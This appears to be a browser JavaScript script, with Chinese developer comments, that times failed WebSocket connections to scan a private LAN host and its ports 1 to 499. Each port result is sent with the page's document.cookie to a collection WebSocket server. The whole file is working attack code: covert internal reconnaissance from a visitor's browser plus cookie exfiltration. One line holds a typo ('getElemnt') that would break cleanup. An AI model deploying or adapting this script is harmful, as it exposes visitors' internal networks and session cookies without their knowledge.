var server = 'ws://127.0.0.1:5555/'
var result = new WebSocket(server)
var ip_scan = [1,2,80,110,443,554,3702,5000,8000,8080,8899,34567,37777,37778];
var hashMap = new HashMap()
var netid = '192.168.'
for(var subnetid=10;subnetid<11;subnetid++) {
    for(var hostid=2;hostid<3;hostid++) {
        let ip = 'ws://' + netid + subnetid + '.'+hostid + '/'
        let timeStampStart = new Date().getTime()
        hashMap.put(ip, timeStampStart)

        //1. 创建对IP发送的websocket
        let ip_socket = new WebSocket(ip)

        //2. 监听error事件
        ip_socket.addEventListener('error', function (e) {
            // 收到报错
            let timeStampEnd = new Date().getTime()
            let ip_time = timeStampEnd - hashMap.get(e.srcElement.url)

            hashMap.remove(e.srcElement.url)
            if(ip_time<8000) {
                portmap = new HashMap()
                //for(var portnum=1;portnum<556;portnum++) {
                for(var portnum=1;portnum<500;portnum++) {
                    let port_string = e.srcElement.url
                    let port = port_string.substring(0,port_string.length-1) + ":" + portnum +'/'
                    if (portnum==80) {
                        port = e.srcElement.url
                    }
                    let port_timeStampStart = new Date().getTime()
                    portmap.put(port,port_timeStampStart)
                    let port_socket = new WebSocket(port)
                    port_socket.addEventListener('error', function (e) {

                        let port_timeStampEnd = new Date().getTime()
                        //let port_time = port_timeStampEnd - portmap.get(e.srcElement.url)
                        let port_time = port_timeStampEnd - port_timeStampStart

                        let msg = {
                            host: document.cookie,
                            //ip: e.srcElement.url,
                            ip: e.srcElement.url.substring(5,e.srcElement.url.length-1),
                            ping: port_time
                        }
                        let msgJSON = JSON.stringify(msg)
                        result.send(msgJSON)
                        portmap.remove(e.getElemnt.url)            // 清理空间
                        port_socket.close()
                    })
                }
            }
            ip_socket.close()
            })
        }
}

window.addEventListener("beforeunload",function() {
    // 想加个监听事件避免websocket服务器进程在页面强行关闭处的异常
    // 但是好像解决不了= =
    // 不过问题不大，服务器端让他持续运行就好了
    result.close()
})